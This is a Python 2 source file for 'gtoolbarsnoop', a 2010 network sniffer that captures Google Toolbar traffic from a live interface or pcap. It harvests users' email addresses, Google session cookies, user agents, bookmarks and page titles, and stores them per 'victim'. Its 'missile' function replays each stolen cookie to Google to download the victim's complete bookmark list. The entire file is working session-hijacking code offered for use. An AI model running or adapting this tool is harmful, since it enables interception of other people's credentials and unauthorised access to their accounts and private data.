#!/usr/bin/env python
#Copyright (c) 2010 Jeff Bryner
#http://jeffbryner.com
#python script to gather googletoolbar traffic and snoop on it.


#This program is free software; you can redistribute it and/or modify it under
#the terms of the GNU General Public License as published by the Free Software
#Foundation; either version 2 of the License, or (at your option) any later
#version.

#This program is distributed in the hope that it will be useful, but WITHOUT
#ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
#FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

#You should have received a copy of the GNU General Public License along with
#this program; if not, write to the Free Software Foundation, Inc.,
#59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

import sys
import os
import re
import string
import fileinput
import getopt
import time
import base64
import binascii
import nids
#missile
import urllib
import urllib2


program= 'gtoolbarsnoop by jeff bryner'
version='v1.0'
safestringre=re.compile('[\x00-\x1F\x80-\xFF]')
def safestring(badstring):
        """makes a good strings out of a potentially bad one by escaping chars out of printable range"""
        return safestringre.sub('',badstring)

#regexes
faviconre=re.compile(r"""GET /favicon""",re.IGNORECASE)
useragentre=re.compile(r"""User-Agent:(.*GoogleToolbar.*?)Host""",re.IGNORECASE|re.DOTALL)
bookmarksre=re.compile(r"""<bookmarks>""",re.IGNORECASE|re.DOTALL)
setgooglecookiere=re.compile(r"""Set-Cookie:(.*?)domain=\.google\.com""",re.IGNORECASE|re.DOTALL)
tbgooglecookiere=re.compile(r"""GET.*GoogleToolbar.*Cookie:(.*HSID=\w.{1,50})http""",re.IGNORECASE|re.DOTALL)
#tbgooglecookiere=re.compile(r"""GET.*GoogleToolbar.*Cookie:(.*)http""",re.IGNORECASE|re.DOTALL)
titlere=re.compile(r"""<bookmark><title>(.*?)</title>""",re.IGNORECASE|re.DOTALL)
tbemailre=re.compile(r"""<email data="(.*?)".*services>""",re.IGNORECASE|re.DOTALL)
sload=""

#states that close a transmission and cause us to inspect it
end_states = (nids.NIDS_CLOSE, nids.NIDS_TIMEOUT, nids.NIDS_RESET, nids.NIDS_EXITING, nids.NIDS_TIMED_OUT)

#globals
victims=[]		#list of victims..er folks we've found out about.
victimscookies={}	#dictionary of the folks cookies
victimsuseragents={}	#dictionary of the folks useragents



def handleTcpStream(tcp):
	if options['debug']:	
		print "tcps -", str(tcp.addr), " state:", tcp.nids_state
	if tcp.nids_state == nids.NIDS_JUST_EST:
        	# new to us, but is it one we're monitoring?
	        ((src, sport), (dst, dport)) = tcp.addr
        	if dport ==80 or sport==80:
			if options['debug']:	
		            print "collecting data between: " , tcp.addr
			tcp.client.collect = 1
			tcp.server.collect = 1
	elif tcp.nids_state == nids.NIDS_DATA:
	        # keep all of the stream's new data
	    	tcp.discard(0)

	#got anything to examine?
	#two options here..wait for data or wait for end of stream. End of stream is conservative and more consistent, but lags if feed a stdin stream
	#if (options['file'] <> '-' and tcp.nids_state in end_states) or 
	#if ( options['file']=='-' and (len(str(tcp.server.data[:tcp.server.count]).strip())>0 or tcp.nids_state in end_states)):
	if tcp.nids_state in end_states:	
		sload=""
	        ((src, sport), (dst, dport)) = tcp.addr	
		if options['debug']:
		        print "processing stream between:", tcp.addr		
		sload=str(tcp.server.data[:tcp.server.count]).strip()
		sload=sload + str(tcp.client.data[:tcp.client.count]).strip()

		if useragentre.findall(sload) and tbemailre.findall(sload):
			#we collect emails and store stuff indexed by it whether we're asked to or not
			#if we launch cookie missles later, we'll use this info 
			#if we're asked, we'll cough them up along the way.
			if options['debug'] or options['emails']:
				sys.stdout.write('gtoolbarsnoop: found an email address\n')
				sys.stdout.write('Conversation: ' + str(tcp.addr) + '\n')
				sys.stdout.write('clientIP: ' + str(src) + '\n')			
			for email in tbemailre.finditer(sload):
				if options['debug'] or options['emails']:			
					sys.stdout.write(email.group(1) + '\n')
				if email.group(1) not in victims:
					victims.append(email.group(1))
				for cookie in tbgooglecookiere.finditer(sload):
					victimscookies[email.group(1)]=cookie.group(1).strip()	
				for useragent in useragentre.finditer(sload):
					victimsuseragents[email.group(1)]=useragent.group(1).strip()

			
		if useragentre.findall(sload) and faviconre.findall(sload) and options['icons']:
			sys.stdout.write('gtoolbarsnoop: found a favicon hit\n')
			sys.stdout.write('Conversation: ' + str(tcp.addr) + '\n')
			sys.stdout.write('clientIP: ' + str(src) + '\n')			
			sys.stdout.write(str(tcp.server.data[:tcp.server.count]) + '\n')

		if bookmarksre.findall(sload) and options['bookmarks']:
			sys.stdout.write('gtoolbarsnoop: found bookmarks\n')
			sys.stdout.write('Conversation: ' + str(tcp.addr) + '\n')
			sys.stdout.write('clientIP: ' + str(src) + '\n')
			sys.stdout.write(str(tcp.client.data[:tcp.client.count]) + '\n')
			
		if titlere.findall(sload) and options['titles']:
			sys.stdout.write('gtoolbarsnoop: found titles\n')
			sys.stdout.write('clientIP: ' + str(src) + '\n')			
			for title in titlere.finditer(sload):
				sys.stdout.write(title.group(1) + '\n')

		if setgooglecookiere.findall(sload) and useragentre.findall(sload) and options['cookies']:
			sys.stdout.write('gtoolbarsnoop: found set cookie\n')
			sys.stdout.write('clientIP: ' + str(src) + '\n')			
			for cookie in setgooglecookiere.finditer(sload):
				sys.stdout.write(cookie.group(1) + '\n')
				
		if tbgooglecookiere.findall(sload) and useragentre.findall(sload) and options['cookies']:
			sys.stdout.write('gtoolbarsnoop: found toolbar cookie\n')
			sys.stdout.write('clientIP: ' + str(src) + '\n')			
			for cookie in tbgooglecookiere.finditer(sload):
				sys.stdout.write(cookie.group(1) + '\n')
				
				
def missilesAway():
	if len(victimscookies)>0:
		for vic in victims:	
			sys.stdout.write('launching cookie missle against: ' + vic + '\n')
			#clients1-4 return identical dns ips...
			url = 'http://clients4.google.com/bookmarks/?output=xml&all=1'
			user_agent = victimsuseragents.get(vic)
			cookie=victimscookies.get(vic)

			#the right way to do values..that I'm ignoring.
			#values = {'name' : 'Michael Foord',
        		#	  'location' : 'Northampton',
        		#	  'language' : 'Python' }

			headers = { 'User-Agent:' : user_agent,'Cookie:' : cookie  }
			#data = urllib.urlencode(values)
			data=''
			req = urllib2.Request(url, data, headers)
			#debug
			#sys.stderr.write('url:' + str(req.get_full_url()) + '\n')
			#sys.stderr.write('headers:' + str(req.header_items()) + '\n')
			response = urllib2.urlopen(req)
			sys.stdout.write(vic + 'bookmarks: ' + str(response.read()) + '\n')


def main():
	global options
	options = read_options()
	nids.param("scan_num_hosts", 0)         # disable portscan detection

	#if options['file'] <> '-':
	#	nids.param("filename", options['file'])
	#else: 
	#	nids.param("filename", sys.stdin.name)
	
	if options['file'] and os.path.isfile(options['file']):                  # read a pcap file?
        	nids.param("filename", options['file'])
	else:
	    	nids.param("device", options['file']) #assume network device.		
				
	nids.init()
	nids.register_tcp(handleTcpStream)
	# Loop forever (network device), or until EOF (pcap file)
	# Note that an exception in the callback will break the loop!
	try:
		nids.run()
	except nids.error, e:
		print "nids/pcap error:", e
	except Exception, e:
		print "misc. exception (runtime error in user callback?):", e
	if options['debug']:
		sys.stderr.write('Grand totals:\n')
		sys.stderr.write('Victims: ' + str(victims) + '\n')
		sys.stderr.write('VictimsCookies: ' + str(victimscookies) + '\n')
		sys.stderr.write('VictimsUserAgents: ' + str(victimsuseragents) + '\n')
	if options['missile']:
		missilesAway()
	sys.exit()
	

def read_options():
	"""Read options from config files and the command line, returns the 
	defaults if no user options are found"""

	# required options
	required = ['file']

	# defaults
	options = {'file'   : '',
        	   'debug'    : False,
        	   'verbose': False,
		   'icons': False,
		   'bookmarks': False,
		   'titles': False,
		   'emails': False,
		   'cookies': False,
		   'missile': False
		   }

    # read from command line
	helpstr = 'Usage: ' + sys.argv[0] + ' [OPTIONS]' + """\n
Options:
   -f, --file   <filename>  the pcap input file or network device name (eth0/wlan0/tap0) to use 
   -b, --bookmarks	    show bookmarks found
   -c, --cookies	    show cookies found
   -i, --icons	    	    show favicon hits
   -t, --titles		    show bookmark/page titles found
   -e, --emails		    show email addresses found
   -m, --missile	    fsck waiting around for passive hits, send a cookie missile
   			    and force google to give up a users bookmarks.
   -a, --all		    show all bookmarks, favicon hits,cookies and titles *and* launch cookie missle
   -d, --debug              run in debug mode with crazy output
   -h, --help   
   -v, --verbose            show some internal details
   -V, --version            show version info\n
A '*' means this option is required and has to be set."""

	optlist, args = getopt.getopt(sys.argv[1:], 'f:inbcetamhVv', ['file=', 'help', 'version', 'verbose' ,'debug','bookmarks','cookies','icons','titles','all','missile','emails'])

	# parse options
	for o, a in optlist:
		if (o == '-h' or o == '--help'):
			print helpstr
			sys.exit()
		elif (o == '-V' or o == '--version'):
			print program, version
			sys.exit()
		elif (o == '-v' or o == '--verbose'):
			options['verbose'] = True
		elif (o == '-d' or o == '--debug'):
			options['debug'] = True
		elif (o =='-i' or o == '--icons'):
			options['icons'] = True
		elif (o =='-b' or o == '--bookmarks'):
			options['bookmarks'] = True
		elif (o =='-c' or o == '--cookies'):			
			options['cookies'] = True
		elif (o =='-t' or o == '--titles'):
			options['titles'] = True
		elif (o =='-e' or o == '--emails'):
			options['emails'] = True
		elif (o =='-m' or o == '--missile'):		
			options['missile'] = True		
		elif (o =='-a' or o == '--all'):
			options['icons'] = True
			options['bookmarks'] = True
			options['titles'] = True
			options['cookies']= True
			options['emails']= True			
			options['missile']= True
			
		
		else:
			for option in options.keys():
				execcode = "if (o == '-%s' or o == '--%s'): options['%s'] = a" % (option[0], option, option)
				exec execcode

	for option in required:
		if not options[option]:
			print "Required option '%s' is not set! (add a --help option for help)" % option
			sys.exit()

	if ( options['file']=='-' and options['debug'] ):
		sys.stderr.write('reading from stdin\n')
		
	if options['verbose']:
		sys.stderr.write("options: " + str(options) + '\n')
	# return all options
	return options

if __name__ == '__main__':
    main()
